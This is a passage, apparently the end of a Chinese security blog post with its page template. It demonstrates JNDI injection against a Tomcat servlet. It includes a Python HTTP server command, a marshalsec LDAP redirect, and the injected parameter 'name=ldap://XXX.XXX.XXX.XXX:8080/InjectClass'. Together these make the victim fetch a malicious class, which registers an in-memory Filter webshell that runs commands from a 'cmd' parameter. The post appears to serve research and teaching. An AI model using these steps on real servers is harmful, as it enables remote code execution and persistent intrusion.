+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 -m http.server 3389</span><br></pre></td></tr></table></figure>
+
+<p>这两个服务中，marshalsec服务运行在8080端口，在受害端使用<code>ldap://XXX.XXX.XXX.XXX:8080/InjectClass</code>尝试访问ldap服务时，marshalsec会将运行http服务的3389端口告诉受害端，受害端从3389端口下载class文件</p>
+<p>搭建完成服务后，在受害端的<code>/hello-servlet</code>路由传递<code>name=ldap://XXX.XXX.XXX.XXX:8080/InjectClass</code>参数</p>
+<p>服务器能够接收受害端的class的下载请求</p>
+<p><img src="/%5Cimg%5Cpost%5Cimage-20260118153131270.png" alt="image-20260118153131270"></p>
+<p>受害端的界面：</p>
+<p><img src="/%5Cimg%5Cpost%5Cimage-20260118151930268.png" alt="image-20260118151930268"></p>
+<p>这个错误不成问题，由于JNDI 规范要求如果一个类作为 <code>ObjectFactory</code> 被引用，它必须实现 <code>javax.naming.spi.ObjectFactory</code> 接口，但是这发生在我们的恶意Filter实例化并注册之后，查看Tomcat的控制台确实打印了success字样</p>
+<p><img src="/%5Cimg%5Cpost%5Cimage-20260118151647617.png" alt="image-20260118151647617"></p>
+<p>说明我们的内存马成功被受害端远程加载并注册了，在任意界面传入cmd参数，也能够成功执行命令</p>
+<p><img src="/%5Cimg%5Cpost%5Cimage-20260118151744484.png" alt="image-20260118151744484"></p>
+<br/>
+</article><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/Java/">Java</a></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related full-width" href="/2026/01/16/Agent%E5%8F%8A%E5%85%B6%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0/" title="Java Agent及其内存马实现"><img class="cover" src="/img/post21.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="info text-right"><div class="info-1"><div class="info-item-1">Next</div><div class="info-item-2">Java Agent及其内存马实现</div></div><div class="info-2"><div class="info-item-1">对一切保持辩证态度是对的</div></div></div></a></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/head.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">楽依</div><div class="author-info-description"></div><div class="site-data"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">29</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">5</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">3</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/lenonline2021-source"><i class="fab fa-github"></i><span>Github</span></a></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Contents</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#JNDI%E6%B3%A8%E5%85%A5"><span class="toc-number">1.</span> <span class="toc-text">JNDI注入</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86"><span class="toc-number">1.1.</span> <span class="toc-text">注入原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#JNDI%E6%B3%A8%E5%85%A5%E5%86%85%E5%AD%98%E9%A9%AC"><span class="toc-number">1.2.</span> <span class="toc-text">JNDI注入内存马</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Posts</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2026/01/18/JNDI%E6%B3%A8%E5%85%A5/" title="JNDI注入"><img src="/img/post22.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="JNDI注入"/></a><div class="content"><a class="title" href="/2026/01/18/JNDI%E6%B3%A8%E5%85%A5/" title="JNDI注入">JNDI注入</a><time datetime="2026-01-18T07:38:32.000Z" title="Created 2026-01-18 15:38:32">2026-01-18</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2026/01/16/Agent%E5%8F%8A%E5%85%B6%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0/" title="Java Agent及其内存马实现"><img src="/img/post21.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Java Agent及其内存马实现"/></a><div class="content"><a class="title" href="/2026/01/16/Agent%E5%8F%8A%E5%85%B6%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0/" title="Java Agent及其内存马实现">Java Agent及其内存马实现</a><time datetime="2026-01-16T14:28:41.000Z" title="Created 2026-01-16 22:28:41">2026-01-16</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2026/01/15/Tomcat%20Valve%E5%86%85%E5%AD%98%E9%A9%AC/" title="Tomcat Valve内存马"><img src="/img/post20.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Tomcat Valve内存马"/></a><div class="content"><a class="title" href="/2026/01/15/Tomcat%20Valve%E5%86%85%E5%AD%98%E9%A9%AC/" title="Tomcat Valve内存马">Tomcat Valve内存马</a><time datetime="2026-01-15T07:03:19.000Z" title="Created 2026-01-15 15:03:19">2026-01-15</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2026/01/15/Interceptor%E5%86%85%E5%AD%98%E9%A9%AC/" title="Interceptor内存马"><img src="/img/post19.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Interceptor内存马"/></a><div class="content"><a class="title" href="/2026/01/15/Interceptor%E5%86%85%E5%AD%98%E9%A9%AC/" title="Interceptor内存马">Interceptor内存马</a><time datetime="2026-01-14T17:16:40.000Z" title="Created 2026-01-15 01:16:40">2026-01-15</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2026/01/12/Java%E5%8A%A8%E6%80%81%E7%B1%BB%E7%BC%96%E8%AF%91%E7%AE%80%E6%9E%90/" title="Java动态类编译简析"><img src="/img/post18.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Java动态类编译简析"/></a><div class="content"><a class="title" href="/2026/01/12/Java%E5%8A%A8%E6%80%81%E7%B1%BB%E7%BC%96%E8%AF%91%E7%AE%80%E6%9E%90/" title="Java动态类编译简析">Java动态类编译简析</a><time datetime="2026-01-12T13:57:42.000Z" title="Created 2026-01-12 21:57:42">2026-01-12</time></div></div></div></div></div></div></main><footer id="footer" style="background-color: #757575;"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2025 - 2026 By 楽依</span><span class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 8.1.1</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.5.2</a></span></div><div class="footer_custom_text">你已经抵达世界尽头啦~</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Reading Mode"><i class="fas fa-book-open"></i></button><button id="hide-aside-btn" type="button" title="Toggle Between Single-column and Double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="Settings"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back to Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=5.5.2"></script><script src="/js/main.js?v=5.5.2"></script><div class="js-pjax"></div><script>
+  // 页面加载完成后隐藏动画
+  window.addEventListener('load', function() {
+    setTimeout(function() {
+      const loadingEl = document.getElementById('custom-loading');
+      if (loadingEl) {
+        loadingEl.style.opacity = '0';
+        setTimeout(function() {
+          if (loadingEl.parentNode) {
+            loadingEl.remove();
+          }
+        }, 500);
+      }
+    }, 1000);
+  });
+</script>
+<script async data-pjax src="/"></script></div></body></html>
